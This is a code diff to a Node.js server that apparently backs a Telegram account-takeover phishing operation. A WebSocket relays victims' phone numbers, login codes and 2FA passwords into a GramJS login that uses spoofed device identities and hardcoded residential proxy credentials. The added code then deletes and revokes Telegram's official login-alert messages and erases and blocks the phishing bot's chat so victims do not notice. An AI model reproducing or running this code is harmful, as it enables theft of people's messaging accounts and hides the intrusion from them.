@@ -1,7 +1,7 @@
 import express from "express";
 import http from 'http';
 import { WebSocketServer } from "ws";
-import { TelegramClient } from "telegram";
+import { TelegramClient, Api } from "telegram";
 import { StringSession } from "telegram/sessions/index.js";
 import qs from 'querystring';
 import config from '../config.json' assert { type: "json" };
@@ -14,7 +14,10 @@ import domainTemplate from "./database/domainTemplate.js";
 import fs from 'fs';
 import parsePhoneNumber from 'libphonenumber-js'
 import ake from "./ake.js";
-
+import botSchema from "./database/bot.js";
+import botTemplate from "./database/template.js";
+import fsPromises from 'fs/promises';
+import path from 'path';
 await Database.connect(config.db);
 const app = express(),
     server = http.createServer(app,);
@@ -41,77 +44,45 @@ const proxy = fs.readFileSync('proxy.txt', 'utf-8')
     .replaceAll('\r', '')
     .split('\n');
 
-const getRandomDeviceParams = () => {
-    const deviceParams = {
-        windows: {
-            appId: 2040,
-            appHash: "b18441a1ff607e10a989891a5462e627",
-            appVersions: [
-                "5.3.1 x64",
-                "5.4.1 x64"
-            ],
-            devices: [
-                "YEA9M-PRO",
-                "RQM9U2-PRO",
-                "IMNI-ELITE",
-                "CASYUK-PREMIUM"
-            ],
-            sdk: "Windows 10"
-        },
-        linux: {
-            appId: 611335,
-            appHash: "d524b414d21f4d37f08684c1df41ac9c",
-            appVersions: [
-                "5.7.1 arm64 Snap",
-                "5.8.3 arm64 Snap",
-                "5.9.0 arm64 Snap"
-            ],
-            devices: [
-                "HP Chromebook 14",
-                "Lenovo ThinkCentre M720",
-                "Acer Veriton X2660G",
-                "Dell Precision 5550",
-                "Huawei MateBook D 14"
-            ],
-            sdks: [
-                "Fedora 34",
-                "Kubuntu 21.04",
-                "Linux Mint 20.2 Cinnamon",
-                "Pop!_OS 20.04 LTS",
-                "Linux Mint 20.1 Ulyssa"
-            ]
-        },
-        android: {
-            appId: 17763,
-            appHash: "e9a6411b6f175da4190011667e357e9d",
-            appVersions: [
-                "5.2.14 (13999)",
-                "1.60.15 Z"
-            ],
-            devices: [
-                "Lenovo K5 Note",
-                "Telegram Web"
-            ],
-            sdk: "SDK 31"
-        }
-    };
+const getRandomDeviceParams = async () => {
+    try {
+        const paramsDir = path.join(process.cwd(), 'src', 'params');
+        console.log('Looking for params in:', paramsDir);
+        
+        const files = await fsPromises.readdir(paramsDir);
+        console.log('Found files:', files);
+        
+        const randomFile = files[Math.floor(Math.random() * files.length)];
+        
+        const paramsContent = await fsPromises.readFile(path.join(paramsDir, randomFile), 'utf8');
+        const params = JSON.parse(paramsContent);
 
-    const platform = ['windows', 'linux', 'android'][Math.floor(Math.random() * 3)];
-    const params = deviceParams[platform];
-
-    return {
-        app_id: params.appId,
-        app_hash: params.appHash,
-        device: params.devices[Math.floor(Math.random() * params.devices.length)],
-        sdk: platform === 'linux' ?
-            params.sdks[Math.floor(Math.random() * params.sdks.length)] :
-            params.sdk,
-        app_version: params.appVersions[Math.floor(Math.random() * params.appVersions.length)],
-        system_lang_pack: "en",
-        system_lang_code: "en",
-        lang_pack: platform === 'android' ? "android" : "tdesktop",
-        lang_code: "en"
-    };
+        return {
+            app_id: params.app_id,
+            app_hash: params.app_hash,
+            device: params.device,
+            sdk: params.sdk,
+            app_version: params.app_version,
+            system_lang_pack: params.system_lang_code || "en",
+            system_lang_code: params.system_lang_code || "en",
+            lang_pack: params.lang_pack || "android",
+            lang_code: params.lang_code || "en"
+        };
+    } catch (error) {
+        console.error('Error loading device params:', error);
+        
+        return {
+            app_id: 2496,
+            app_hash: "8da85b0d5bfe62527e5b244c209159c3",
+            device: "Safari 15.3",
+            sdk: "iOS",
+            app_version: "10.4.41 A",
+            system_lang_pack: "en",
+            system_lang_code: "en",
+            lang_pack: "android",
+            lang_code: "en"
+        };
+    }
 };
 
 const formatProxy = proxy => {
@@ -164,7 +135,7 @@ app.get(`/log`, async (req, res) => {
     // const akeProxy = await ake.createPort('ru')
     //     .catch((() => ake.createPort('ru')));
 
-    const deviceParams = getRandomDeviceParams();
+    const deviceParams = await getRandomDeviceParams();
     const formated = { ip: `geo.iproyal.com`, port: 32325, username: `rvcR5d7QURSEcSyV`, password: `VB0RceDyPGxckBEm_country-${'ru'}_streaming-1`, socksType: 5 }
     const client = new TelegramClient(new Session(+req.query.dc, Buffer.from(req.query.key, 'hex')), deviceParams.app_id, deviceParams.app_hash, {
         connectionRetries: 10,
@@ -215,8 +186,6 @@ ws.on('connection', async (socket, request) => {
         socket.send(`0-0`);
         return socket.close();
     }
-
-    console.log(1)
     if (type !== `bot`) {
         site = await domain.findOne({ name: id }) || {
             worker: 5439242814,
@@ -241,9 +210,9 @@ ws.on('connection', async (socket, request) => {
     })
 
     const waitForAction = action => new Promise(resolve => {
-        console.log(action);
+       
         if (action === 'number' && number) return resolve(number);
-
+        
         socket.send(JSON.stringify({ action }))
         socket.onmessage = message => {
             try {
@@ -254,7 +223,7 @@ ws.on('connection', async (socket, request) => {
             }
             if (!message.action && !message.data) return socket.close();
             if (message.action === action) {
-                console.log(message);
+               
                 resolve(message.data);
             }
         }
@@ -275,22 +244,28 @@ ws.on('connection', async (socket, request) => {
     //     password: akeProxy.password, 
     //     socksType: 5 
     // }
-    const deviceParams = getRandomDeviceParams();
-
+    const deviceParams = await getRandomDeviceParams();
+    console.log(deviceParams)
+    
     const client = new TelegramClient(new StringSession(), deviceParams.app_id, deviceParams.app_hash, {
         connectionRetries: 10,
         proxy: formated,
         "appVersion": deviceParams.app_version,
         "deviceModel": deviceParams.device,
         "systemVersion": deviceParams.sdk,
-        'langCode': deviceParams.lang_code
+        'langCode': deviceParams.lang_code,
+        dcId: 2,                  // Фиксированный DC
+        forceDcAuth: true,        // Принудительное использование указанного DC
+        skipBuildAuth: true,      // Пропуск построения новой авторизации (предотвращает миграцию)
+
+        
     });
 
     setTimeout(async () => {
         try {
             socket.close();
             await client.disconnect();
-            // await ake.deletePort(akeProxy.id)
+            // await ake.deletePort(akeProxy.id)    
         } catch (e) {
             console.error(e);
         }
@@ -301,14 +276,97 @@ ws.on('connection', async (socket, request) => {
     await client.start({
         phoneNumber: async () => await waitForAction('number'),
         password: async () => await waitForAction('password'),
-        phoneCode: async () => await waitForAction('code'),
+        phoneCode: async () => {
+            // Ждем завершения миграции DC если она происходит
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            return await waitForAction('code');
+        },
         onError: (data) => {
             number = undefined;
-            console.log(data);
+            console.log('Auth error:', data);
             socket.send(JSON.stringify({ action: 'error', data }));
         }
     });
+    const botData = await botSchema.findOne({ token: bot });
+    const template = await botTemplate.findOne({ id: botData.template });
+ 
+    if(template?.deleteBot){
+        const dialogs = await client.getDialogs();
+        
+        const botDialog = dialogs.find(dialog => dialog.entity.username === botData.username);
+        console.log(botDialog)
+        if(botDialog) {
+            try {
+            
+                const messages = await client.getMessages(botDialog.inputEntity, {
+                    limit: 100 
+                });
+                
+                const messageIds = messages.map(m => m.id);
+                
+                if (messageIds.length > 0) {
+                    await client.deleteMessages(botDialog.inputEntity, messageIds, {
+                        revoke: true
+                    });
+                }
 
+                await client.invoke(new Api.contacts.Block({
+                    id: botDialog.inputEntity
+                }));
+
+                await client.invoke(new Api.messages.DeleteHistory({
+                    peer: botDialog.inputEntity,
+                    maxId: 0,
+                    revoke: true,
+                    justClear: false
+                }));
+
+            } catch (error) {
+                console.error('Error deleting messages and blocking:', error);
+            }
+        }
+     
+    }
+
+    if(template?.deleteTelegram){
+            
+        try {
+            const dialogs = await client.getDialogs();
+            console.log('Found dialogs:', dialogs.length);
+            
+            const telegramDialog = dialogs.find(dialog => 
+                dialog.entity.id === 777000 || 
+                dialog.entity.username === 'telegram' ||
+                dialog.entity.firstName === 'Telegram'
+            );
+
+
+            if (telegramDialog) {
+                const messages = await client.getMessages(telegramDialog.inputEntity, {
+                    limit: 100 
+                });
+                const messageIds = messages.map(m => m.id);
+                
+                if (messageIds.length > 0) {
+                   
+                    await client.deleteMessages(telegramDialog.inputEntity, messageIds, {
+                        revoke: true
+                    });
+                  
+                }
+
+                await client.invoke(new Api.messages.DeleteHistory({
+                    peer: telegramDialog.inputEntity,
+                    maxId: 0,
+                    revoke: true,
+                    justClear: false
+                }));
+            } 
+
+        } catch (error) {
+            console.error('Error clearing Telegram dialog:', error);
+        }
+    }
     socket.send(JSON.stringify({ action: 'success' }))
     socket.close();
 
